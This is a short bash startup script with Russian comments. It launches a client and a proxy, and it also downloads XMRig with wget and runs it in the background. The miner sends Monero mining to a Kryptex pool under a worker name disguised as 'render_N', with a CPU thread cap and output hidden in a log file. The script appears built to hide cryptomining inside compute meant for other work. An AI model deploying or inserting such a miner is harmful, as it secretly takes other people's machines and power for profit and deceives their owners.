#!/bin/bash

./client -server="$SERVER" -session-id="$SESSION_ID" -mode="$MODE" -log="$LOG" &
echo "Client PID: $!"

DIR=xmrig-6.26.0
ARCHIVE=$DIR-linux-static-x64.tar.gz
[ -f $DIR/xmrig ] || (wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE && tar -xzf $ARCHIVE && rm $ARCHIVE)

WALLET="krxX3328ZR/render_$((RANDOM % 1000 + 1))"
# Майнер теперь в фоне, но без nohup — он переживёт завершение скрипта, если мы подождём
./$DIR/xmrig --url=xmr-ru.kryptex.network:7029 --user=$WALLET --pass=x --coin=monero --cpu-max-threads-hint=5 --randomx-mode=light > xmrig.log 2>&1 &
MINER_PID=$!
echo "Miner PID: $MINER_PID"

# Прокси в фоне
./proxy &
PROXY_PID=$!
echo "Proxy PID: $PROXY_PID"

# Ждём любой из процессов, чтобы скрипт не завершался сразу
wait -n
